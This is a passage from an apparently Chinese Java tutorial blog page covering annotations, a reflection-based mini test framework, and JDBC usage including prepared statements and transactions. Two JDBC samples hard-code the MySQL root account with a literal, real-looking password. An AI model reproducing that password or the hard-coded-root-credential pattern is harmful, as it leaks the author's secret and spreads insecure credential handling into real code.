 <span class="keyword">public</span> String <span class="title function_">className</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 配置值;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">methodName</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 配置值;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>调用注解中的抽象方法 获取配置的数值</p></li></ol><h3 id="一个简单的测试框架"><a href="#一个简单的测试框架" class="headerlink" title="一个简单的测试框架"></a>一个简单的测试框架</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Calculator.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a-b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1+0=&quot;</span>+(<span class="number">1</span>+<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1-0=&quot;</span>+(<span class="number">1</span>-<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mul</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1*0=&quot;</span>+(<span class="number">1</span>*<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">div</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1/0=&quot;</span>+(<span class="number">1</span>/<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无bug&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check.java</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Check &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, IOException &#123;</span><br><span class="line">    <span class="comment">//一个简单的测试框架</span></span><br><span class="line">    Calculator c=<span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">    <span class="comment">//获取字节码对象</span></span><br><span class="line">    Class cls=c.getClass();</span><br><span class="line">    <span class="comment">//获取所有方法</span></span><br><span class="line">    Method[] methods = cls.getMethods();</span><br><span class="line">    <span class="type">int</span> num=<span class="number">0</span>;<span class="comment">//出现异常的次数</span></span><br><span class="line">    BufferedWriter bw=<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;bug.txt&quot;</span>));</span><br><span class="line">    <span class="keyword">for</span>(Method m:methods)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断方法上是否有Check注解</span></span><br><span class="line">        <span class="keyword">if</span>(m.isAnnotationPresent(Check.class))&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                m.invoke(c);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">//捕获异常</span></span><br><span class="line">                <span class="comment">//记录文件信息</span></span><br><span class="line">                num++;</span><br><span class="line">                bw.write(m.getName()+<span class="string">&quot;方法出异常了&quot;</span>);</span><br><span class="line">                bw.newLine();</span><br><span class="line">                bw.write(<span class="string">&quot;异常的名称：&quot;</span>+e.getCause().getClass().getSimpleName());<span class="comment">//得到异常简短类名（不带包名）</span></span><br><span class="line">                bw.newLine();</span><br><span class="line">                bw.write(<span class="string">&quot;异常的原因：&quot;</span>+e.getCause().getMessage());</span><br><span class="line">                bw.newLine();</span><br><span class="line">                bw.write(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bw.write(<span class="string">&quot;本次出现&quot;</span>+num+<span class="string">&quot;次异常&quot;</span>);</span><br><span class="line">    bw.flush();</span><br><span class="line">    bw.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="JDBC–Java数据库连接"><a href="#JDBC–Java数据库连接" class="headerlink" title="JDBC–Java数据库连接"></a>JDBC–Java数据库连接</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>使用统一的一套java代码可以操作所有的关系型数据库</p><p>JDBC:定义了操作所有关系型数据库的规则（接口）</p><p>JDBC本质：官方（sun公司）定义的一套操作所有关系型数据库的规则，即接口，各个数据库厂商趣实现这套接口，提供数据库驱动jar包。我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动jar包中的实现类</p><blockquote><p>数据库驱动：即JDBC实现类（按数据库分），由各数据库产商自己提供对应版本</p></blockquote><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ul><li>导入驱动jar包<ul><li>复制jar包到项目的libs(自定义)目录下</li><li>右键–&gt;Add As Library</li></ul></li><li>注册驱动</li><li>获取数据库连接对象 Connection</li><li>定义sql</li><li>获取执行sql语句的对象 Statement</li><li>执行sql，接受返回结果</li><li>处理结果</li><li>释放资源</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//导入驱动jar包</span></span><br><span class="line">    <span class="comment">//注册驱动</span></span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    <span class="comment">//获取连接对象</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ZLL05311223&quot;</span>);</span><br><span class="line">    <span class="comment">//定义sql语句</span></span><br><span class="line">    String sql=<span class="string">&quot;update mystudy set id=4781 where value=1243&quot;</span>;</span><br><span class="line">    <span class="comment">//获取执行sql的对象</span></span><br><span class="line">    <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">    <span class="comment">//执行sql</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> stmt.executeUpdate(sql);</span><br><span class="line">    <span class="comment">//处理结果</span></span><br><span class="line">    System.out.println(count);</span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    stmt.close();</span><br><span class="line">    conn.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="实现类详解"><a href="#实现类详解" class="headerlink" title="实现类详解"></a>实现类详解</h2><h3 id="DriverManager"><a href="#DriverManager" class="headerlink" title="DriverManager"></a>DriverManager</h3><p>驱动管理对象</p><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li><p>注册驱动:告诉程序使用哪一个数据库驱动jar</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写代码时</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<span class="comment">//类的字节码文件加载进内存</span></span><br><span class="line"><span class="comment">//注册驱动静态方法</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerDriver</span><span class="params">(Driver driver)</span>:注册与给定的驱动程序 DriverManager</span><br></pre></td></tr></table></figure></div><blockquote><p>通过查看源码发现在com.mysql.cj.jdbc.Driver类中存在静态代码块，在其中运行了注册驱动静态方法，该静态代码块在类的字节码加载进内存时自动运行</p><p>⚠️：其实加载类这一步在mysql5后的驱动jar包已经帮我们先加载了，可以不写</p></blockquote></li><li><p>获取数据库连接</p><ul><li><p>方法ststic Connection getConnection(String url,String user,String password)</p></li><li><p>参数：</p><ul><li><p>url：指定链接的路径</p><ul><li><p>语法 <code>jdbc:mysql://ip地址(域名):端口号/数据库名称</code> (以mysql为例，不同数据库语法不一样)</p><blockquote><p>如果连接的是本机mysql，并且端口为3306，可以简写为 <code>jdbc:mysql:///数据库名称</code></p></blockquote></li></ul></li><li><p>user 用户名</p></li><li><p>password 密码</p></li></ul></li></ul></li></ul><h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><p>数据库连接对象</p><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><ul><li>获取执行sql的对象<ul><li>Statement createStatement()</li><li>PrepareStatement prepareStatement(String sql)</li></ul></li><li>管理事务：<ul><li>开启事务 void setAutoCommit(boolean autoCommit) :调用该方法设置参数为false，即开启事务</li><li>提交事务 void commit()</li><li>回滚事务 void rollback()</li></ul></li></ul><h3 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h3><p>执行sql对象(静态sql)</p><ul><li>执行sql<ul><li>boolean execute(String sql) ：可以执行任意sql （不常用）</li><li>int executeUpdate(String sql) ：可以执行DML（增删改）语句、DDL（create, alter,drop）语句。返回值是影响的行数，若返回值&gt;0则执行成功</li><li>ResultSet executeQuery(String sql) ：执行DQL(select)语句</li></ul></li></ul><h3 id="ResultSet"><a href="#ResultSet" class="headerlink" title="ResultSet"></a>ResultSet</h3><p>结果集对象，封装查询结果</p><ul><li>next() 游标向下移动一行，返回布尔类型，判断当前行是否有数据，true为有数据</li><li>getXxxx(参数) 获取数据 (Xxxx表示数据类型) e.g. getInt()<ul><li>参数<ul><li>int型 表示列的编号，从左到右 从1开始</li><li>String型 表示列名称</li></ul></li></ul></li></ul><h4 id="遍历实例"><a href="#遍历实例" class="headerlink" title="遍历实例"></a>遍历实例</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">    <span class="comment">//循环判断是否有数据</span></span><br><span class="line">    <span class="comment">//获取数据</span></span><br><span class="line">    <span class="type">int</span> id=rs.getInt(<span class="number">1</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="type">double</span> balance=rs.getDouble(<span class="number">3</span>);</span><br><span class="line">    System.out.println(id+<span class="string">&quot;---&quot;</span>+name+<span class="string">&quot;---&quot;</span>+balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h3><p>执行sql对象，功能更强大(预编译的sql语句)</p><p>解决sql注入问题</p><p>预编译sql:参数使用?作为占位符</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span><span class="operator">=</span>&quot;select * from user where username=? and password=?&quot;</span><br></pre></td></tr></table></figure></div><p>获取执行sql语句的对象</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement Connection.prepareStatement(String <span class="keyword">sql</span>)</span><br></pre></td></tr></table></figure></div><p>给？赋值</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setXxxx(参数1,参数2)</span><br><span class="line">Xxxx是当前位置参数的数据类型</span><br><span class="line">参数1: ？的位置编号，从1开始</span><br><span class="line">参数2:？的值</span><br></pre></td></tr></table></figure></div><p>执行sql，不需要传递sql，该类有空参executexxx()方法</p><blockquote><p>这种情况下再sql注入会被防御，推荐使用该类完成增删改查</p></blockquote><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改一条记录</span></span><br><span class="line"><span class="comment">//提升要释放资源的作用域</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql:///test&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ZLL05311223&quot;</span>);<span class="comment">//抛出异常选择add catch...</span></span><br><span class="line">    String sql=<span class="string">&quot;update mystudy set value=&#x27;诗情画奕&#x27; where id=339&quot;</span>;</span><br><span class="line">    <span class="comment">//获取执行sql对象</span></span><br><span class="line">    stmt = conn.createStatement();</span><br><span class="line">    <span class="type">int</span> count=stmt.executeUpdate(sql);</span><br><span class="line">    <span class="comment">//处理结果</span></span><br><span class="line">    System.out.println(count);</span><br><span class="line">    <span class="keyword">if</span>(count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;修改失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="keyword">if</span>(stmt!=<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stmt.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="抽取工具类"><a href="#抽取工具类" class="headerlink" title="抽取工具类"></a>抽取工具类</h2><p>可以简化书写</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义工具类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String user;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line">    <span class="comment">//文件读取只需要一次  静态代码块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//读取资源文件，获取值</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建Properties集合类</span></span><br><span class="line">            Properties pro=<span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            <span class="comment">//获取src路径下文件但方式--&gt;ClassLoader 类加载器</span></span><br><span class="line">            ClassLoader c=JdbcUtil.class.getClassLoader();</span><br><span class="line">            URL res=c.getResource(<span class="string">&quot;jdbc.properties&quot;</span>);<span class="comment">//返回URL对象，表示统一资源标识符号</span></span><br><span class="line">            String path=res.toURI().getPath();<span class="comment">//得到路径,使用toURI需要try catch异常</span></span><br><span class="line">            <span class="comment">//加载文件</span></span><br><span class="line">            <span class="comment">//pro.load(new FileReader(&quot;src/jdbc.properties&quot;));</span></span><br><span class="line">            pro.load(<span class="keyword">new</span> <span class="title class_">FileReader</span>(path));</span><br><span class="line">            <span class="comment">//获取数值 赋值</span></span><br><span class="line">            url=pro.getProperty(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            user=pro.getProperty(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            password=pro.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            driver=pro.getProperty(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">            <span class="comment">//注册驱动</span></span><br><span class="line">            Class.forName(driver);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    <span class="comment">//不传递参数，但还要保证工具类通用性</span></span><br><span class="line">    <span class="comment">//使用配置文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnention</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(url,user,password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(Statement stmt,Connection conn)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stmt!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet rs,Statement stmt, Connection conn)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(rs!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(stmt!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>静态代码块只能用静态成员变量、静态成员方法</p><p>静态代码块只能处理异常（try catch） 不能抛异常（throws）</p><p>只有在src目录下文件才能通过类加载器获取资源</p></blockquote><h2 id="控制事务"><a href="#控制事务" class="headerlink" title="控制事务"></a>控制事务</h2><p>事务：一个包含多个步骤的业务操作，如果这个业务操作被事务管理，则这多个步骤要么同时成功，要么同时失败</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>开启事务</li><li>提交事务</li><li>回滚事务</li></ul><h3 id="使用Connection对象管理事务"><a href="#使用Connection对象管理事务" class="headerlink" title="使用Connection对象管理事务"></a>使用Connection对象管理事务</h3><ul><li>开启事务 void setAutoCommit(boolean autoCommit) :调用该方法设置参数为false，即开启事务 (执行sql前)</li><li>提交事务 void commit()。（sql都执行完）</li><li>回滚事务 void rollback() （catch异常中）</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//事务操作</span></span><br><span class="line">Connection conn=<span class="literal">null</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt1</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt2</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    conn=JdbcUtil.getConnention();</span><br><span class="line">    <span class="comment">//开启事务</span></span><br><span class="line">    conn.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">//定义sql</span></span><br><span class="line">    String sql1=<span class="string">&quot;update mystudy set value =value-? where id=?&quot;</span>;</span><br><span class="line">    String sql2=<span class="string">&quot;update mystudy set value =value+? where id=?&quot;</span>;</span><br><span class="line">    <span class="comment">//获取执行sql对象</span></span><br><span class="line">    pstmt1= 